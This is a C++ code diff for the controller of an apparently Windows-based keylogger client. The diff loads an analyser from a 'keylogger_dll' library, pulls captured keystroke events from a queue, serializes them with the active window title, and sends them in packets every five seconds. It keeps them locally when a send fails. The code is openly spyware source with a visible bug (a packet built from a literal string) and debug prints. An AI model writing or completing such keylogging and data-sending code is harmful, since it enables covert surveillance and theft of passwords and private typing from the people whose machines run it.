@@ -56,6 +56,7 @@ clientController::clientController(void) throw(DLibraryException)
 	// KeyLogger
 	if (!(this->dictKeyLogger = this->libraries.handler.getDictionaryByName("keylogger_dll")))
 		throw DLibraryException("keylogger_dll", "Couldn't get Dictionary.");
+	this->analyser = ((_getAnalyser)(*this->dictKeyLogger)["getAnalyser"])();
 
 	// DataHandler
 	if (!(this->dictDataHandler = this->libraries.handler.getDictionaryByName("dataHandler")))
@@ -82,9 +83,10 @@ int				clientController::mainAction(int ac, char **av)
 	while (!this->quit)
 	{
 		this->sendLocalDataAction();
-		serialized = this->serializeQueueAction();
-		if (!this->sendPacketAction(new Packet(0, 101, true, serialized.size(), "serialized.c_str()")))
+		if ((serialized = this->serializeQueueAction()) != ""
+			&& !this->sendPacketAction(new Packet(0, 101, true, serialized.size(), "serialized.c_str()")))
 			this->storeEventAction(serialized);
+		Sleep(5000);
 	}
 
 	threadKeyLogging.detach();
@@ -121,14 +123,20 @@ bool			clientController::sendLocalDataAction(void)
 		this->dataHandler->fileHandler->removeLocalData(10);
 		buffer = this->dataHandler->fileHandler->extractDataFromStream(10);
 	}
+	std::cout << "END SEND LOCAL DATA" << std::endl;
 	return (true);
 }
 
-std::string	clientController::serializeQueueAction(void)
+std::string			clientController::serializeQueueAction(void)
 {
-	// TO-DO
-	std::cout << "serialize event ..." << std::endl;
-	return (std::string(""));
+	std::string		res("");
+	AEvent			*e = (AEvent *)this->eventQueue->tryPull();
+
+	std::cout << "serialize Queue ..." << std::endl;
+	if (!e)
+		return (res);
+	res += this->dataHandler->serializer->serializeEvent(this->analyser->getWindowTitle(e), this->analyser->analysis(e));
+	return (res);
 }
 
 bool		clientController::sendPacketAction(Packet *packet)
